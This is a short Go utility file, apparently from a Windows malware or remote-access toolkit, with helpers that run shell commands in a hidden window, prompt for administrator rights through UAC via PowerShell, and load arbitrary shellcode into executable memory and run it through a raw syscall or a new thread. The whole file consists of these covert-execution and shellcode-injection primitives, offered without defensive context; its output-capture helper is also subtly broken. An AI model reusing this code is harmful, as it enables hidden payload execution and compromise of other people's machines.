package utils

import "os/exec"
import "syscall"
import "unsafe"

// Run start command in minimized window and returns output
func Run(cmd string) string {
	e := exec.Command("cmd", "/C", cmd)
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	e.Run()
	res, _ := e.Output()
	return string(res)
}

// Please ask for admin using UAC and runs command
func Please(RawCommand string) string {
	return Run("powershell.exe -Command Start-Process -Verb RunAs " + string(RawCommand))
}

func SyscallExecute(Shellcode []byte) bool {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	go syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}

func ThreadExecute(Shellcode []byte) {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)

	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}
